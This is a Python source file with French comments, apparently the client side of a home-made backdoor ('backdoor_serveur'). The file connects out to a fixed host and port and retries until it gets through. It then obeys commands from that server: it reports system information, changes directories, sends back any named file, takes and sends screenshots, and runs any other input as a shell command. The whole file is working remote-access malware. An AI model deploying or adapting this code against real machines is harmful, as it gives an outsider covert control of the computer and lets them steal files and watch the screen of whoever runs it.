from backdoor_serveur import MAX_SIZE
from PIL import ImageGrab
import socket
import time
import subprocess
import os
import platform

HOST_IP = "192.168.1.104"
HOST_PORT = 32000

temps_avant_nouvelle_tentative = 1
while True: 
    try:
        s = socket.socket()  
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur")
        print(f"Nouvelle tentative dans {temps_avant_nouvelle_tentative} secondes")
        time.sleep(temps_avant_nouvelle_tentative)
    else:
        print("Connecté au serveur.")
        break

while True:
    commande_data = s.recv(MAX_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande : ", commande)
    commande_split = commande.split(" ", 1)
    #REINITIALISATION DE LA REPONSE A NONE A CHAQUE BOUCLE
    reponse_encode = None
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()
    elif commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = f"ERREUR : le répertoire {commande_split[1]} n'est pas valide."
        reponse = reponse.encode()
    #GESTION DE LA COMMANDE DL POUR DOWNLOAD
    elif commande_split[0] == "dl":
        # OUVERTURE DU FICHIER EN BINAIRE
        try:
            f = open(commande_split[1].strip("'"), "rb")
        except FileNotFoundError:
            #GESTION DU CAS OU IL N'Y A PAS DE FICHIER AVEC LE NOM DONNÉ
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
            #print("OK") #DEBUG
    elif commande_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        nom_capture = commande_split[1]+".png"
        print(nom_capture)
        capture_ecran.save(nom_capture, "PNG")
        # OUVERTURE DU FICHIER EN BINAIRE
        try:
            f = open(nom_capture, "rb")
        except FileNotFoundError:
            #GESTION DU CAS OU IL N'Y A PAS DE FICHIER AVEC LE NOM DONNÉ
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
            #print("OK") #DEBUG
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()
    # la réponse est déjà encodée dans tous les cas ci-dessus
    data_len = len(reponse)
    header = str(data_len).zfill(13)
    print("header:", header) #DEBUG
    s.sendall(header.encode())
    s.sendall(reponse)
    #print("longueur reponse : ", len(reponse.encode())) #DEBUG
s.close()
print(f"Connexion au serveur IP : {HOST_IP}, Port {HOST_PORT}.")

